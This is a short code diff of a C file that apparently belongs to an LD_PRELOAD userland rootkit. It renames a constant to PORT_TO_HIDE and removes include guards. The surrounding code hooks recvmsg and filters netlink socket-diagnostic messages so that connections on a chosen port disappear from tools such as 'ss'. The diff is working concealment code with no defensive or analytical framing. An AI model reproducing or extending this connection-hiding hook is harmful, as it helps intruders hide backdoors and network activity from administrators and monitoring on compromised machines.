@@ -1,6 +1,3 @@
-#ifndef SS_H
-#define SS_H
-
 #define _GNU_SOURCE
 #include <string.h>
 #include <dlfcn.h>
@@ -15,7 +12,7 @@ static int is_target_msg(struct nlmsghdr *nlh) {
     if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(struct inet_diag_msg))) return 0;
     
     struct inet_diag_msg *msg = NLMSG_DATA(nlh);
-    if (ntohs(msg->id.idiag_sport) == TARGET_PORT || ntohs(msg->id.idiag_dport) == TARGET_PORT) return 1;
+    if (ntohs(msg->id.idiag_sport) == PORT_TO_HIDE || ntohs(msg->id.idiag_dport) == PORT_TO_HIDE) return 1;
     return 0;
 }
 
@@ -44,5 +41,4 @@ ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
     return ret;
 }
 
-#endif // SS_H
 
